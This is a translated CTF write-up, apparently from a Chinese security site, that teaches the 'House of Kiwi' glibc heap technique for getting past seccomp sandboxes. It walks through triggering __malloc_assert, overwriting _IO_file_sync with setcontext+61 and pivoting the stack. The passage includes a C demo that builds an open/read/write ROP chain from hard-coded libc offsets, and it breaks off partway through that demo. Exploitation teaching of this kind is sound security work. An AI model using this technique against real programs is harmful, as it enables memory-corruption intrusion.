# House OF Kiwi
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## House_OF_Kiwi
CTF的Pwn题里面,通常就会遇到一些加了沙盒的题目,这种加沙盒的题目,在2.29之后的堆题中,通常为以下两种方式
  1. 劫持`__free_hook`,利用特定的gadget,将栈进行迁移
  2. 劫持`__malloc_hook`为`setcontext+61`的gadget,以及劫持`IO_list_all`单链表中的指针在exit结束中,在`_IO_cleanup`函数会进行缓冲区的刷新,从而读取flag
因为`setcontext + 61`从2.29之后变为由RDX寄存器控制寄存器了,所以需要控制RDX寄存器的指向的位置的部分数据
    :    mov    rsp,QWORD PTR [rdx+0xa0]
    :    mov    rbx,QWORD PTR [rdx+0x80]
    :    mov    rbp,QWORD PTR [rdx+0x78]
    :    mov    r12,QWORD PTR [rdx+0x48]
    :    mov    r13,QWORD PTR [rdx+0x50]
    :    mov    r14,QWORD PTR [rdx+0x58]
    :    mov    r15,QWORD PTR [rdx+0x60]
    :    test   DWORD PTR fs:0x48,0x2
    :    je     0x7ffff7e31156 
    ->
    :    mov    rcx,QWORD PTR [rdx+0xa8]
    :    push   rcx
    :    mov    rsi,QWORD PTR [rdx+0x70]
    :    mov    rdi,QWORD PTR [rdx+0x68]
    :    mov    rcx,QWORD PTR [rdx+0x98]
    :    mov    r8,QWORD PTR [rdx+0x28]
    :    mov    r9,QWORD PTR [rdx+0x30]
    :    mov    rdx,QWORD PTR [rdx+0x88]
    :    xor    eax,eax
    :    ret
###  缺点
但是如果将exit函数替换成`_exit`函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用`_IO_cleanup`,若再将`__malloc_hook`和`__free_hook`给ban了,且在输入和输出都用read和write的情况下,无法hook且无法通过IO刷新缓冲区进行调用,这时候就涉及到ptmalloc源码里面了
###  使用场景
  1. 能够触发`__malloc_assert`,通常是堆溢出导致
  2. 能够任意写,修改`_IO_file_sync`和`IO_helper_jumps + 0xA0 and 0xA8`  
####  __malloc_assert
  * GLIBC 2.32/malloc.c:288  
glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个fflush(stderr)的函数调用,其中会调用`_IO_file_jumps`中的sync指针
        static void
    __malloc_assert (const char *assertion, const char *file, unsigned int line,
           const char *function)
    {
    (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
               __progname, __progname[0] ? ": " : "",
               file, line,
               function ? function : "", function ? ": " : "",
               assertion);
    fflush (stderr);
    abort ();
    }
如何触发assert?在`_int_malloc`中存在一个 assert (chunk_main_arena
(bck->bk));位置可以触发,此外当`top_chunk`的大小不够分配时,则会进入sysmalloc中
  * GLIBC 2.32/malloc.c:2394 
        ......
    assert ((old_top == initial_top (av) && old_size == 0) ||
            ((unsigned long) (old_size) >= MINSIZE &&
             prev_inuse (old_top) &&
             ((unsigned long) old_end & (pagesize - 1)) == 0));
    ......
此处会对top_chunk的`size|flags`进行assert判断
    1. old_size >= 0x20;
    2. old_top.prev_inuse = 0;
    3. old_top页对齐
通过这里也可以触发assert  
下面手动实现进入assert后,可以想到fflush和fxprintf都和IO有关,可能需要涉及IO,一步步调试看看可以发现在`fflush`函数中调用到了一个指针:位于`_IO_file_jumps`中的`_IO_file_sync`指针,且观察发现RDX寄存器的值为`IO_helper_jumps`指针,多次调试发现RDX始终是一个固定的地址
如果存在一个任意写,通过修改 `_IO_file_jumps + 0x60`的`_IO_file_sync`指针为`setcontext+61`  
修改`IO_helper_jumps + 0xA0 and 0xA8`分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移
###  Demo
一个简单的演示用的DEMO
    // Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2
    //gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define pop_rdi_ret libc_base + 0x000000000002858F
    #define pop_rdx_r12 libc_base + 0x0000000000114161
    #define pop_rsi_ret libc_base + 0x000000000002AC3F
    #define pop_rax_ret libc_base + 0x0000000000045580
    #define syscall_ret libc_base + 0x00000000000611EA
    #define ret pop_rdi_ret+1
    size_t libc_base;
    size_t ROP[0x30];
    char FLAG[0x100] = "./flag.txt\x00";
    void sandbox()
    {
        prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
        struct sock_filter sfi[] ={
            {0x20,0x00,0x00,0x00000004},
            {0x15,0x00,0x05,0xC000003E},
            {0x20,0x00,0x00,0x00000000},
            {0x35,0x00,0x01,0x40000000},
            {0x15,0x00,0x02,0xFFFFFFFF},
            {0x15,0x01,0x00,0x0000003B},
            {0x06,0x00,0x00,0x7FFF0000},
            {0x06,0x00,0x00,0x00000000}
        };
        struct sock_fprog sfp = {8, sfi};
        prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &sfp);
    }
    void setROP()
    {
        uint32_t i = 0;
        ROP[i++] = pop_rax_ret;
        ROP[i++] = 2;
        ROP[i++] = pop_rdi_ret;
        ROP[i++] = (size_t)FLAG;
        ROP[i++] = pop_rsi_ret;
        ROP[i++] = 0;
        ROP[i++] = syscall_ret;
        ROP[i++] = pop_rdi_ret;
        ROP[i++] = 3;
        ROP[i++] = pop_rdx_r12;
        ROP[i++] = 0x100;
        ROP[i++] = 0;
        ROP[i++] = pop_rsi_ret;
        ROP[i++] = (size_t)(FLAG + 0x10);
        ROP[i++] = (size_t)read;
        ROP[i++] = pop_rdi_ret;
        ROP[i++] = 1;
        ROP[i++] = (size_t)write;
    }
    int main() {
        setvbuf(stdin,0LL,2,0LL);
        setvbuf(stdout,0LL,2,0LL);
        setvbuf(stderr,0LL,2,0LL);
        sandbox();
        libc_base  = ((size_t)setvbuf) - 0x81630;
        printf("LIBC:\t%#lx\n",libc_base);
        size_t magic_gadget = libc_base + 0x53030 + 61; // setcontext + 61
        size_t IO_helper = libc_base + 0x1E48C0; // _IO_hel
        per_jumps;